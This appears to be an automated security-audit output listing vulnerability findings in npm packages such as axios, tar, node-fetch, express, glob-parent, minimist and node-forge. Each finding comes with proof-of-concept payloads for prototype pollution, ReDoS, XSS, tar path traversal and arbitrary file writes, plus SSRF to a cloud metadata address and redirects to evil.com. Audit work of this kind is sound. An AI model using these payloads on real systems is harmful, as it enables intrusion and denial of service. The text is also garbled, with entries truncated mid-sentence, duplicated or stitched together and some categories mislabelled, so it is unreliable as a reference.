Title: Protestware release 6.6.6 removes runtime entry point, causing denial of service in dependent applications
Category: security-misconfiguration
Severity: high
Description: The published faker@6.6.6 package is missing its advertised main entry point and the library source files entirely. package.json declares `"main": "index.js"`, but `index.js` is absent from the package, and the installed tarball contains only metadata files plus a one-line README (`What really happened with Aaron Swartz?`). Any application that installs this version and attempts `require('faker')` or imports exported APIs will fail at runtime with a module resolution error. Because this package 
Request: package.json declares main=index.js; package contents enumeration of faker@6.6.6 under /tmp/pwnkit-audit-32835d51/node_modules/faker
Response: package.json: `"main": "index.js"`
find output:
./.github/FUNDING.yml
./.eslintrc
./.gitattributes
./.travis.yml
./Readme.md
./.eslintignore
./.versions
./package.json
Readme.md content:
`What really happened with Aaron Swartz?`

Title: Unbounded IPC message buffering allows trivial remote memory exhaustion DoS
Category: regex-dos
Severity: medium
Description: Both the client and server accumulate incoming socket data into an in-memory string until a configured delimiter is seen, with no maximum frame size or timeout. In `dao/client.js`, the `data` handler appends attacker-controlled bytes to `this.ipcBuffer` and returns early whenever the delimiter is absent (`data=(this.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ ... return; }`). In `dao/socketServer.js`, `gotData()` does the same with `s
Request: Attacker sends an endless stream or a very large payload without the configured delimiter (`\f` by default) to a node-ipc server/client connection.
Response: In `dao/socketServer.js` lines around 157-170: `if(!sock.ipcBuffer){ sock.ipcBuffer=''; } data=(sock.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ this.log('Messages are large, You may want to consider smaller messages.'); return; }`.
In `dao/client.js` lines around 216-229: `if(!this.ipcBuffer){ this.ipcBuffer=''; } data=(this.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ client.log('Messages are large, You may want to consider smaller messages.'); return; }`
Analysis: The package treats the delimiter as the only message boundary check. If the delimiter never arrives, the library retains the entire attacker-controlled stream in memory forever. There is no frame length limit, no backpressure-based rejection, and no connection termination on oversized frames. This makes denial of service reliable and low-complexity. Impact is real because the vulnerable code is on the default receive path for every non-rawBuffer connection.

Title: Prototype pollution via _.set and _.zipObjectDeep path handling
Category: prototype-pollution
Severity: high
Description: The package exports Lodash 4.17.11 APIs including `set` and `zipObjectDeep`. In this version, `_baseSet.js` walks attacker-controlled path segments and writes them with `assignValue()`/`baseAssignValue()` without blocking magic keys like `__proto__`, `constructor`, or `prototype`. Request: Source review:
- package.json main = lodash.js; package name loadsh version 0.0.4
- set.js exports baseSet(object, path, value)
- _baseSet.js assigns path segments with assignValue(nested, key, newValue) and does not reject __proto__
- zipObjectDeep.js returns baseZipObject(props, values, baseSet)
- _baseAssignValue.js special-cases key == '__proto__' and calls Object.defineProperty

Dynamic PoC:

```js
let o = {};
_.set(o, '__proto__.polluted', 'yes');
console.log('set polluted?', {}.polluted, Object.prototype.polluted);
let z = _.zipObjectDeep(['__proto__.zpolluted'], ['zip']);
console.log('zip polluted?', {}.zpolluted, Object.prototype.zpolluted, z.__proto__ && z.__proto__.zpolluted);
```

zip polluted? zip zip zip
Analysis: This is a real, exploitable prototype pollution. The public API directly accepts attacker-controlled property paths. Supplying `__proto__` as the first path segment causes `nested` to become `Object.prototype`; the subsequent assignment writes arbitrary properties to the global prototype. Title: Absolute URL in request config bypasses baseURL and enables SSRF in common wrapper patterns
Category: ssrf
Severity: medium
Description: Axios 0.21.0 will ignore `baseURL` whenever `config.url` is absolute or protocol-relative. The vulnerable behavior is implemented in `lib/core/buildFullPath.js`, which returns `requestedURL` unchanged if `isAbsoluteURL(requestedURL)` is true. `isAbsoluteURL()` treats both `scheme://...` and `//host/...` as absolute (`lib/helpers/isAbsoluteURL.js`). The Node adapter then parses and requests that attacker-controlled absolute URL directly (`lib/adapters/http.js`: `var fullPath = buildFullPath(confi
Request: Source review of `buildFullPath()` / `isAbsoluteURL()` / Node `httpAdapter` in axios@0.21.0. Example attacker input to public API: `axios.create({baseURL:'https://api.internal.local/'}).get('http://169.254.169.254/latest/meta-data/')`.
Response: `buildFullPath(baseURL, requestedURL)` only combines URLs when `requestedURL` is not absolute; otherwise it returns `requestedURL` unchanged. `isAbsoluteURL(url)` returns true for `/^([a-z][a-z\d\+\-\.]*:)?\/\//i/`, which includes `http://...` and `//...`. `httpAdapter` then performs `url.parse(fullPath)` and dispatches the request to `parsed.hostname`.
Analysis: The library's documented and common usage pattern is to create an axios instance with a trusted `baseURL` and then pass untrusted path segments at call time. Because absolute and protocol-relative URLs short-circuit baseURL joining, attacker input can redirect the outbound request to arbitrary hosts. This is a direct SSRF primitive in server-side consumers, not merely misuse, because the public API accepts the untrusted string and the vulnerable code path is the default URL resolution behavior.

Title: Arbitrary file read/write via hardlink extraction outside destination
Category: path-traversal
Severity: high
Description: tar@4.4.12 resolves hardlink targets against the extraction cwd using `path.resolve(this.cwd, entry.linkpath)` and then calls `fs.link()` without validating that the resolved target stays within the destination directory. A malicious archive can therefore create a hardlink inside the extraction root that points to any existing file outside the extraction directory. Applications that later read or modify the extracted file will transparently access and modify the outside target.

Vulnerable code 
Request: Created a tar archive with a single hardlink entry `hl` of type `Link` and `linkpath` set to `../sensitive.txt`, then extracted it with `new tar.Unpack({cwd: out})`.
Response: ENTRY hl Link ../sensitive.txt
{"hlExists":true,"same":true,"content":"SECRET"}
Analysis: The extracted file `out/hl` exists and shares the same inode as `../sensitive.txt`, proving that the package created a hardlink to a file outside the extraction root. Because hardlinks alias the same underlying inode, any subsequent reads or writes to the extracted path affect the external target. This is a real path traversal / arbitrary file link creation vulnerability in default extraction behavior.

Title: Regular Expression Denial of Service in enclosure regex
Category: regex-dos
Severity: medium
Description: The public API `globParent(str, opts)` applies the regex `/[\{\[].*[\/]*.*[\}\]]$/` to attacker-controlled input before any length checks or parsing. This pattern contains overlapping greedy quantifiers (`.*[\/]*.*`) anchored at end-of-string, which causes catastrophic backtracking on inputs that begin with `{` or `[` but do not contain a closing `}` or `]`. Because `glob-parent` is commonly used on untrusted glob patterns in build tools, file watchers, and web backends that accept include/exclu
Request: const gp = require('glob-parent'); gp('{'.repeat(2000));
Response: Local timing reproduction on the audited package version 5.1.0:
- 100 chars -> 1-2 ms
- 500 chars -> 39-78 ms
- 1000 chars -> 306-616 ms
- 2000 chars -> 2407-4878 ms
- 4000 chars -> 19065 ms
The slowdown is super-linear and reaches ~19 seconds for a 4k-character payload, demonstrating catastrophic backtracking in the enclosure regex.
Analysis: `index.js` defines `var enclosure = /[\{\[].*[\/]*.*[\}\]]$/;` and calls `if (enclosure.test(str)) { ... }` on untrusted `str`. An input like `'{' .repeat(n)` satisfies the opening-character class but never provides the required closing delimiter, forcing the engine to explore many backtracking states across the adjacent `.*`, `[\/]*`, and `.*` segments. This is a real, reachable DoS in the package itself (not merely a transitive dependency issue), matching the known advisory fixed in 5.1.2.

Severity: high
Description: The exported parser in index.js allows attacker-controlled argument names containing magic property paths such as `__proto__`, `constructor.prototype`, and nested dotted keys. Request: const parse = require('minimist'); parse(['--__proto__.polluted','yes']); console.log({}.polluted);
Response: Running against minimist@0.0.8 produced `{}.polluted = yes` after parsing, while the returned argv object was `{ _: [] }`, showing the write happened on Object.prototype rather than only inside argv.
Analysis: `index.js` calls `setKey(argv, key.split('.'), value)`. For the key `__proto__.polluted`, `keys.slice(0,-1)` contains `['__proto__']`. On a plain object, `o['__proto__']` resolves to the object's prototype (`Object.prototype`), so `o = o[key]` enters the prototype object. The final assignment `o['polluted'] = value` therefore adds a property to `Object.prototype`. This is a real exploitable prototype pollution primitive affecting any application that parses attacker-influenced arguments or optio

Title: Sensitive headers are forwarded across cross-origin redirects
Category: information-disclosure
Severity: high
Description: node-fetch@2.6.6 automatically follows redirects and reuses the original request headers for the redirected request without stripping sensitive headers such as Authorization, Cookie, Cookie2, or Proxy-Authorization when the redirect target is a different origin or protocol. In lib/index.js, the redirect-following path builds `requestOpts` with `headers: new Headers(request.headers)` and then immediately calls `fetch(new Request(locationURL, requestOpts))`. There is no origin/protocol trust check
Request: lib/index.js redirect handling around lines 1501-1561: on redirect, `const requestOpts = { headers: new Headers(request.headers), ... }` followed by `resolve(fetch(new Request(locationURL, requestOpts)))` with no header scrubbing for cross-origin/protocol redirects.
Response: In lib/index.js the redirect path copies the original headers verbatim:

- `const requestOpts = { headers: new Headers(request.headers), ... }`
- later `resolve(fetch(new Request(locationURL, requestOpts)))`

No code in the redirect path checks whether `locationURL` changes hostname, domain, or protocol, and no code removes `authorization`, `cookie`, or related sensitive headers before issuing the redirected request.
Analysis: This is directly attacker-exploitable in common usage because applications frequently use node-fetch with bearer tokens, basic auth, or session cookies and leave `redirect: 'follow'` as the default. If the upstream server or an on-path application endpoint can cause a redirect to an untrusted origin, those credentials are disclosed to the redirect destination. The issue is a real confidentiality vulnerability and matches the known advisory GHSA-r683-j2x4-v87g / CVE-2022-0235 affecting versions b

Title: Prototype-polluted auth object injects unintended HTTP Basic credentials
Category: prototype-pollution
Severity: high
Description: Axios 0.19.0 deep-merges attacker-controlled config objects without filtering magic keys like `__proto__`. In `lib/core/mergeConfig.js`, the `auth` property is merged via `utils.deepMerge(config1[prop], config2[prop])`. `utils.deepMerge` in `lib/utils.js` recursively copies object properties into a plain `{}` result and will assign `result['__proto__']`, changing the prototype of the returned config object instead of treating it as inert data.

This becomes exploitable in the Node HTTP adapter. 
Request: const axios = require('./');
await axios({
  url: 'http://127.0.0.1:<PORT>/',
  auth: JSON.parse('{"__proto__":{"username":"pollutedUser","password":"pollutedPass"}}')
});
Response: Observed by local test server:
AUTH HEADER: Basic cG9sbHV0ZWRVc2VyOnBvbGx1dGVkUGFzcw==

Base64 decodes to `pollutedUser:pollutedPass`.
Analysis: The payload contains no own `username` or `password` keys. The only supplied key is `__proto__`. Due to unsafe `deepMerge`, the resulting `config.auth` object's prototype is attacker-controlled. `http.js` then reads `config.auth.username` and `config.auth.password` without own-property checks, so inherited values are accepted as credentials and serialized into the outgoing Authorization header. This demonstrates a concrete exploit path from untrusted input to security-sensitive network behavior.

Title: tar.extract() symlink-assisted escape when preservePaths is enabled

Request: Application code invokes `tar.extract({ cwd: '/safe/base', preservePaths: true, file: 'attacker.tar' })` on untrusted archive content. Archive layout: (1) symlink entry `subdir -> ../../outside`, (2) file entry `subdir/payload` with attacker content.

Title: ReDoS in parse() via catastrophic backtracking on crafted nth formulas
Category: regex-dos
Severity: medium
Description: The public API `parse(formula)` in `parse.js` applies the regular expression `/^([+\-]?\d*n)?\s*(?:([+\-]?)\s*(\d+))?$/` to attacker-controlled input after only `trim().toLowerCase()`. Title: HTTP header count DoS during WebSocket upgrade handling
Category: information-disclosure
Severity: medium
Description: `ws@7.4.5` is affected by a denial-of-service condition when handling upgrade requests with a very large number of HTTP headers. The package relies on Node's parsed `IncomingMessage` and then performs upgrade validation on every request in `WebSocketServer.handleUpgrade()`. In affected versions, applications using `ws` are exposed to excessive resource consumption during handshake processing when an attacker floods the request with many headers. This issue is publicly tracked as CVE-2024-37890/G
Request: HTTP Upgrade request containing thousands of distinct headers plus the minimal WebSocket upgrade headers, sent to a `ws` server endpoint.
Response: The vulnerable path is the default server upgrade flow in `lib/websocket-server.js`:

```js
upgrade: (req, socket, head) => {
  this.handleUpgrade(req, socket, head, emitConnection);
}
```

`handleUpgrade()` consumes `req.headers` from the attacker-controlled request and performs validation/negotiation on the parsed header object for every inbound upgrade attempt.
Analysis: This is a known, version-applicable DoS in the target package. Although the exact low-level amplification involves HTTP header handling around upgrade processing, the exposure is meaningful for users of this package because `ws` servers commonly accept unauthenticated upgrades on internet-facing endpoints. The impact is denial of service, not data theft or code execution. I labeled it medium due to availability impact without compromise of confidentiality/integrity. Category is not a perfect fit

Request: const marked = require('./src/marked');\nconsole.log(marked('<script>alert(1)</script>'));\nconsole.log(marked('<svg onload=alert(1)>'));

The default options explicitly disable sanitization. The tokenizer/parser/renderer pipeline preserves raw HTML tokens unchanged, so arbitrary script-bearing markup survives end-to-end. In real deployments, this is often used exactly to render user-generated Markdown into pages, producing a straightforward XSS primitive.

Title: Path traversal in asset filename templates can write emitted files outside output.path
Category: path-traversal
Severity: high
Description: Webpack's asset emission pipeline allows `../` path traversal segments in generated asset filenames, enabling writes outside `output.path` when a build uses asset filename templates such as `[path]` or `[file]` and compiles attacker-controlled resources.

Code path:
- `lib/asset/AssetGenerator.js: getSourceFileName()` derives a relative `sourceFilename` from `module.getResource()` using `makePathsRelative(...)`.
- `lib/asset/AssetGenerator.js: getFilenameWithInfo()` passes that `sourceFilename` 
Request: Source audit of webpack asset emission path. Relevant files: `lib/asset/AssetGenerator.js`, `lib/TemplatedPathPlugin.js`, `lib/Compilation.js`, and `schemas/WebpackOptions.json`.
Response: `lib/asset/AssetGenerator.js`:
- `getSourceFileName(module, runtimeTemplate)` returns `makePathsRelative(..., module.getResource(), ...).replace(/^\.\//, "")`
- `getFilenameWithInfo(...)` calls `compilation.getAssetPathWithInfo(assetModuleFilename, { ..., filename: sourceFilename, ... })`

`lib/TemplatedPathPlugin.js`:
- For `data.filename`, parses resource and sets replacements for `file`, `path`, `base`, `name`, `ext`
- Returns interpolated path directly after placeholder substitution; no normalization or `..` rejection

`lib/Compilation.js`:
- `emitAsset(file, source, assetInfo = {}) { this.assets[file] = source; ... }`
- No filename sanitization before asset storage/emission

`schemas/WebpackOptions.json`:
- `AssetModuleFilename`: relative path only via `"absolutePath": false`
- `FilenameTemplate`: relative path only via `"absolutePath": false`
- No restriction on traversal segments like `../`
Analysis: This is a real write-path traversal bug because webpack's validation model only rejects absolute paths, but the actual sink accepts relative traversal. The source filename for asset modules is derived from the module resource path, placeholder interpolation preserves directory components, and the resulting emitted asset filename is accepted unsanitized. Title: Unbounded message buffering enables remote memory exhaustion DoS
Category: regex-dos
Severity: medium
Description: Both the client and server accumulate incoming socket data into an in-memory `ipcBuffer` until the configured delimiter is observed. There is no maximum frame size, timeout, or buffer reset for delimiter-less streams. A remote peer can open a TCP/TLS/Unix socket connection and continuously send data without the delimiter (`\f` by default), causing unbounded growth of `ipcBuffer` and eventually process memory exhaustion/crash.
Request: Attacker connects to a node-ipc TCP/TLS/Unix socket server and streams arbitrary bytes without ever sending the delimiter terminator. Example behavior: repeatedly send large chunks like `A`*1MB over the socket and keep the connection open.
Response: In `dao/socketServer.js`, `gotData()` does `if(!sock.ipcBuffer){ sock.ipcBuffer=''; } data=(sock.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ this.log('Messages are large, You may want to consider smaller messages.'); return; }`. The same pattern exists in `dao/client.js` for inbound data: `data=(this.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ ... return; }`. No size limit or eviction exists before returning.
Analysis: This is an exploitable denial of service bug, not a theoretical concern. The package is explicitly a network/IPC server/client library. In common usage, applications expose `serveNet()` or `serve()` and accept attacker-controlled peers. Because partial frames are retained indefinitely, any peer that can connect can force the Node.js process to allocate ever-growing strings until memory is exhausted. - `setWith(object, path, value, customizer)` at `lodash.js:13702` calls `baseSet`

Title: Arbitrary file write via symlink entry escaping extraction root
Category: path-traversal
Severity: high
Description: The extraction logic in tar@4.4.12 allows archive-controlled symbolic links to point outside the destination directory, and then writes subsequent file entries through those links. In `lib/unpack.js`, `[SYMLINK]` calls `fs.symlink(entry.linkpath, entry.absolute)` with no validation of `entry.linkpath`. Later, for normal file entries, `[CHECKFS]` only `lstat()`s the final path and `[FILE]` opens `entry.absolute` using `new fsm.WriteStream(entry.absolute, ...)`, which follows symlinks. `lib/mkdir.
Request: Archive layout: 1) SymbolicLink entry with path `subdir` and linkpath `/tmp/escape` (or relative `../escape`), 2) File entry with path `subdir/pwned` and attacker-controlled contents. Call `tar.x({ cwd: '/safe/dest', file: 'evil.tar' })`. Relevant code: `lib/unpack.js` `[SYMLINK] -> this[LINK](entry, entry.linkpath, 'symlink')`; `lib/unpack.js` `[FILE] -> new fsm.WriteStream(entry.absolute, ...)`; `lib/mkdir.js` only checks parent components during mkdir, not final-path symlink targets during file creation.
Response: `lib/unpack.js`:
- `[SYMLINK] (entry) { this[LINK](entry, entry.linkpath, 'symlink') }`
- `[LINK] (entry, linkpath, link) { fs[link](linkpath, entry.absolute, er => { ... }) }`
- `[FILE] (entry) { const stream = new fsm.WriteStream(entry.absolute, { mode: mode, autoClose: false }) ... tx.pipe(stream) }`
- `[CHECKFS]` uses `fs.lstat(entry.absolute, ...)` and if path is absent or reusable calls `[MAKEFS]`, which reaches `[FILE]`.

`lib/mkdir.js`:
- symlink defense exists only while creating parent directories: `else if (st.isSymbolicLink()) return cb(new SymlinkError(part, part + '/' + parts.join('/')))`.
- This check is applied to intermediate `part` values in `mkdir_`, not to the final extraction target when it already exists as a symlink created by the archive.
Analysis: This is a real arbitrary file write primitive. The package intends to extract inside `cwd`, but it does not constrain symlink targets or re-check the resolved destination before opening files. Title: Regular Expression Denial of Service in enclosure regex
Category: regex-dos
Severity: medium
Description: The exported `globParent(str, opts)` function in `index.js` applies the regex `/[\{\[].*[\/]*.*[\}\]]$/` to attacker-controlled input via `enclosure.test(str)`. This pattern contains multiple greedy `.*` segments around an optional `[\/]*` and a required closing character class anchored at end-of-string. For inputs that start with `[` or `{` but never contain a matching closing `]` or `}`, the engine performs extensive backtracking before failing. Because `glob-parent` is commonly used on untrus
Request: const gp=require('glob-parent');
function test(n){ const s='[' + 'a/'.repeat(n) + 'a'; const t=Date.now(); gp(s); return Date.now()-t; }
for (const n of [1000,2000,4000,8000,12000]) console.log(n, test(n));
Response: Observed runtime growth when invoking `globParent` on crafted unmatched enclosure input:
1000 -> 18ms
2000 -> 73ms
4000 -> 284ms
8000 -> 1132ms
12000 -> 2541ms
This demonstrates super-linear backtracking from a single function call on a user-controlled string.
Analysis: `glob-parent` exposes a single public API that directly accepts a string. Before any sanitization, it executes `enclosure.test(str)`. The regex is vulnerable to catastrophic backtracking on non-matching input with an opening `[`/`{` and many path separators but no closing bracket. The measured timings scale roughly quadratically, confirming practical ReDoS. In Node.js, this blocks the single-threaded event loop, enabling denial of service in any application that passes attacker-influenced patter

Title: Sensitive headers are forwarded across cross-origin redirects
Category: information-disclosure
Severity: high
Description: node-fetch@2.6.6 automatically follows HTTP redirects and reuses the original request headers for the redirected request without stripping sensitive headers when the redirect target is a different origin or downgrades trust. 1. `const requestOpts = { headers: new Headers(request.headers), ... }`

```js
const requestOpts = {

  agent: request.agent,
  compress: request.compress,
  method: request.method,
  body: request.body,
  signal: request.signal,
  timeout: request.timeout,
  size: request.size
};
...
resolve(fetch(new Request(locationURL, requestOpts)));
```

Response: Relevant code in lib/unpack.js: `if (!this.preservePaths) { const p = normPath(entry.path); if (p.split('/').includes('..')) return false; const [root, stripped] = stripAbsolutePath(p); if (root) entry.path = stripped; } ... if (path.isAbsolute(entry.path)) entry.absolute = normPath(path.resolve(entry.path)); else entry.absolute = normPath(path.resolve(this.cwd, entry.path))`. Relevant code in lib/strip-absolute-path.js: `const { isAbsolute, parse } = require('path').win32; module.exports = path => { let r = ''; while (isAbsolute(path)) { const root = path.charAt(0) === '/' ? Because the validation logic treats drive-relative names as safe, a malicious archive can write outside the intended extraction directory without requiring non-default options. Title: Unbounded nested blockquote input causes stack exhaustion and process crash
Category: information-disclosure
Severity: medium
Description: marked@2.0.0 recursively tokenizes and parses blockquotes without any depth limit. In `src/Lexer.js`, when a blockquote token is recognized, the lexer immediately recurses with `token.tokens = this.blockTokens(token.text, [], top)`. In `src/Parser.js`, blockquotes are recursively rendered with `body = this.parse(token.tokens)`. The tokenizer strips one leading `> ` prefix per recursion (`src/Tokenizer.js` blockquote handler). An attacker can supply markdown containing thousands of nested `>` pre

marked(payload);
Response: CRASH
Maximum call stack size exceeded
Please report this to https://github.com/markedjs/marked.
Analysis: This is a real, reachable denial-of-service bug in the default parser API. The public entry point `marked(src)` accepts attacker-controlled markdown, and deeply nested blockquote syntax causes recursive descent in both lexing and parsing proportional to nesting depth. The crash is reproducible with default options and no special configuration. Because many Node services convert user markdown server-side, a single crafted payload can terminate request handling or crash the process if uncaught.

The impact is a reliable application-layer DoS through excessive resource consumption and eventual OOM/crash. Title: Denial of service via option/argument named hasOwnProperty
Category: output-manipulation
Severity: medium
Description: The package stores parsed options and arguments in plain JavaScript objects and repeatedly calls `opts.hasOwnProperty(...)` / `args.hasOwnProperty(...)` directly. Because COA allows application code to define arbitrary option and argument names via the public `.name()` API, an application can legitimately create an option or argument named `hasOwnProperty`. If an attacker then supplies that parameter on the command line or through `Cmd.invoke()`, the parsed value overwrites the built-in method w
Request: const coa = require('coa'); const cmd = coa.Cmd().name('test'); cmd.opt().name('hasOwnProperty').long('hop').req().end(); cmd.do(['--hop','x'])
Response: TypeError: opts.hasOwnProperty is not a function
    at Opt._checkParsed (/tmp/pwnkit-audit-cb6b177f/node_modules/coa/lib/opt.js:127:22)
    at Cmd._checkRequired (/tmp/pwnkit-audit-cb6b177f/node_modules/coa/lib/cmd.js:269:28)
    ...
Analysis: `Opt._saveVal()` writes attacker-controlled values into `opts[name]`. With `name === 'hasOwnProperty'`, the assignment replaces the inherited method on the plain object. Multiple code paths then perform direct method calls such as `opts.hasOwnProperty(opt._name)` in `lib/opt.js`, `lib/arg.js`, and `lib/cmd.js`. Title: Prototype pollution via util.setPath allows attacker-controlled writes to Object.prototype
Category: prototype-pollution
Severity: high
Description: The public API `forge.util.setPath(object, keys, value)` in `lib/util.js` writes nested properties without blocking special keys like `__proto__`, `constructor`, or `prototype`. Because `__proto__` is followed as a normal path component, an attacker can write arbitrary properties onto `Object.prototype` when an application passes untrusted path segments to this helper. In common usage this becomes a high-impact prototype pollution primitive that can alter control flow, authorization checks, or d
Request: const forge = require('./lib/index'); let o = {}; forge.util.setPath(o, ['__proto__', 'polluted'], 'yes'); console.log(({}).polluted);
Response: yes
Analysis: `util.setPath` is part of the exported API and accepts attacker-controlled key arrays. Supplying `['__proto__', 'polluted']` causes the function to traverse into `Object.prototype` via the `__proto__` accessor and assign `polluted='yes'`. The PoC shows that a fresh `{}` then inherits the injected property. This is real prototype pollution with process-wide impact.

Title: Prototype pollution via forge.debug.set permits global Object.prototype corruption
Category: prototype-pollution
Severity: high
Description: The exported debugging API in `lib/debug.js` stores data in `forge.debug.storage` using attacker-controlled category names. `forge.debug.set(cat, name, data)` initializes `forge.debug.storage[cat] = {}` and then writes `forge.debug.storage[cat][name] = data` with no protection against `cat='__proto__'`. When that value is used, the write targets `Object.prototype`, letting an attacker inject arbitrary inherited properties into all plain objects in the Node.js process.
Request: const forge = require('./lib/index'); forge.debug.set('__proto__', 'dbg', 'owned'); console.log(({}).dbg);
Response: owned
Analysis: `forge.debug.set` is exported by default from `lib/index.js`. Passing `__proto__` as the category makes `forge.debug.storage[cat]` resolve to `Object.prototype`; the subsequent assignment writes attacker data there. The PoC shows a newly created object inheriting `dbg='owned'`, confirming real prototype pollution.

Title: Express enables unsafe qs parsing with allowPrototypes=true, allowing attacker-controlled prototype properties in req.query
Category: prototype-pollution
Severity: medium
Description: Express 4.17.1 configures its default extended query parser with `allowPrototypes: true`, both in `lib/utils.js` (`parseExtendedQueryString`) and in `lib/middleware/query.js` for custom query parser options. This causes query-string keys that target inherited property names such as `constructor` / `prototype` to be parsed into attacker-controlled structures on `req.query` instead of being rejected. Many Express applications treat `req.query` as a trusted plain object and merge or inspect it for 
Request: Source code: `lib/utils.js` `parseExtendedQueryString(str) { return qs.parse(str, { allowPrototypes: true }); }` and `lib/middleware/query.js` sets `opts.allowPrototypes = true` by default. Dynamic check with a local Express app: GET `/?constructor[prototype][x]=y` returns `{"query":{"constructor":{"prototype":{"x":"y"}}}}`, proving attacker-controlled prototype-reserved keys are accepted into `req.query`.
Response: Dynamic PoC output:
`ctor {"query":{"constructor":{"prototype":{"x":"y"}}}} {}.x= undefined`

Source excerpts:
- `lib/utils.js: parseExtendedQueryString(str) { return qs.parse(str, { allowPrototypes: true }); }`
- `lib/middleware/query.js: if (opts !== undefined && opts.allowPrototypes === undefined) { opts.allowPrototypes = true; }`
Analysis: The vulnerability is in Express itself, not just transitively in qs: Express deliberately opts into unsafe parsing. This means untrusted query strings can define keys that shadow or target prototype-related names, defeating the parser’s default protection. In real applications, `req.query` is often merged into config objects, permission filters, ORM criteria, or template locals. Accepting these names creates exploitable object-confusion and can become full prototype pollution depending on downst

Title: res.redirect() allows untrusted javascript: and scheme-relative targets, enabling open redirect and XSS sinks in common app code Category: output-manipulation Severity: high Description: Express 4.17.1’s `res.redirect()` takes an arbitrary URL, passes it through `res.location()` / `encodeurl`, and reflects it into both the `Location` header and an HTML response body without any scheme or origin validation. When applications do the common pattern `res.redirect(req.query.next)`, an attacker can supply `javascript:alert(1)` or `//evil.com`. Express responds with a 302 and `Location: javascript:alert(1)` / `Location: //evil.com`, and its HTML fallback body contains a clickable link Request: Dynamic PoC app: `app.get('/', (req,res)=>res.redirect(req.query.next));` Requests made with `Accept: text/html`: - `GET /?next=javascript:alert(1)` - `GET /?next=//evil.com` - `GET /?next=%2f%2fevil.com` Response: Observed responses: - For `/?next=javascript:alert(1)`: `302`, `Location: javascript:alert(1)`, body `

Found. Redirecting to javascript:alert(1)

` - For `/?next=//evil.com`: `302`, `Location: //evil.com`, body `

Found. Redirecting to //evil.com

` - For `/?next=%2f%2fevil.com`: `302`, `Location: //evil.com`, body `

Found. Redirecting to //evil.com

` Relevant source: `res.location()` returns `this.set('Location', encodeUrl(loc));` `res.redirect()` then uses that attacker-controlled address directly in the redirect response. Analysis: This is a real vulnerability in Express core because the framework exposes a dangerous sink with no built-in validation despite the extremely common pattern of redirecting to user-supplied return URLs. The defect is not merely app misuse: Express’s API accepts arbitrary schemes and scheme-relative URLs and emits them in security-sensitive redirect contexts. The same code path underlies the published Express redirect advisories affecting this version. The issue is exploitable remotely anywhere ap

Title: Regular Expression Denial of Service in enclosure detection
Category: regex-dos
Severity: medium
Description: The exported `globParent(str, opts)` function in `index.js` applies the regular expression `var enclosure = /[\{\[].*[\/]*.*[\}\]]$/;` to attacker-controlled input before any length checks or parsing. This pattern contains multiple greedy `.*` sections around an optional character class and is anchored only at the end, causing catastrophic backtracking on crafted non-matching strings with many opening enclosure characters and a later `/`. Because `glob-parent` is commonly used on untrusted glob/
Request: Invoke the public API with a crafted input such as `'['.repeat(n) + '/' + 'a'`.
Reproduction script:
```js
const gp = require('glob-parent');
const s = '['.repeat(4000) + '/' + 'a';
const t = Date.now();
gp(s);
console.log(Date.now() - t);
```

Response: Measured runtime growth using the installed package version:
- n=100 -> 2 ms
- n=500 -> 140 ms
- n=1000 -> 309 ms
- n=2000 -> 2414 ms
- n=4000 -> TIMEOUT after 10 seconds

This shows super-linear backtracking from the `enclosure.test(str)` call on attacker-controlled input.
Analysis: The vulnerable code path is directly reachable through the package's only public export. No special options are required. The regex executes before the loop that strips parent directories, so the attack cost is paid immediately on a single call. In applications that process user-controlled globs, this can be exploited for denial of service by blocking the Node.js event loop. This is the known advisory affecting versions 4.0.0-5.1.1 and is meaningfully present in 5.1.0.

Title: node-fetch forwards Authorization/Cookie headers across cross-origin redirects
Category: information-disclosure

Description: node-fetch@2.6.6 follows redirects by cloning the original request headers into a new Request without stripping sensitive headers when the redirect target changes origin or protocol. In lib/index.js, the redirect handling path builds `requestOpts = { headers: new Headers(request.headers), ... }` and then immediately performs `fetch(new Request(locationURL, requestOpts))`. There is no check for hostname/protocol/port changes and no removal of `Authorization`, `Cookie`, or related sensitive header
Request: Audit evidence from lib/index.js redirect flow: on redirect, node-fetch executes `const requestOpts = { headers: new Headers(request.headers), follow: request.follow, counter: request.counter + 1, agent: request.agent, compress: request.compress, method: request.method, body: request.body, signal: request.signal, timeout: request.timeout, size: request.size };` and then `resolve(fetch(new Request(locationURL, requestOpts)));` with no origin comparison or header scrubbing.
Response: Relevant code in lib/index.js:
- `const locationURL = location === null ? null : resolve_url(request.url, location);`
- `const requestOpts = { headers: new Headers(request.headers), ... }`
- `resolve(fetch(new Request(locationURL, requestOpts)));`
No code between these lines compares old/new origin or deletes `authorization`, `cookie`, `cookie2`, or proxy auth headers.
Analysis: This is exploitable in common usage because applications frequently attach API tokens, session cookies, or internal authentication headers to fetch requests. If the first response is a redirect to a different origin, node-fetch automatically follows it by default (`redirect: 'follow'`) and reuses the original headers verbatim. Description: tar@6.1.8's extraction path validation in lib/unpack.js only rejects entry.path components containing '..' and strips absolute roots using strip-absolute-path(). On Windows, `path.resolve(cwd, 'C:foo')` and related drive-relative forms resolve relative to the current directory on drive C, not beneath the
Request: Extract a tar archive containing an entry path like `C:../Windows/Temp/pwned.txt` using `tar.x({ cwd: 'C:\\safe' })` on Windows.
Response: In lib/unpack.js CHECKPATH(), only `p.split('/').includes('..')` and stripAbsolutePath(p) are applied before `entry.absolute = normPath(path.resolve(this.cwd, entry.path))`. strip-absolute-path.js uses path.win32.isAbsolute(), which returns false for drive-relative paths like `C:foo`, so no stripping occurs. The resulting resolved path is then used as the write target in FILE() / HARDLINK() / SYMLINK().
Analysis: This is a real write-primitive because the sink is direct filesystem creation during extraction. The validation logic assumes non-absolute paths remain under cwd, but Windows drive-relative paths violate that assumption. An attacker only needs a victim application to extract an untrusted tarball on Windows, which is a common use case for this library.

Title: Symlink cache poisoning enables arbitrary file overwrite outside extraction root
Category: path-traversal
Severity: high
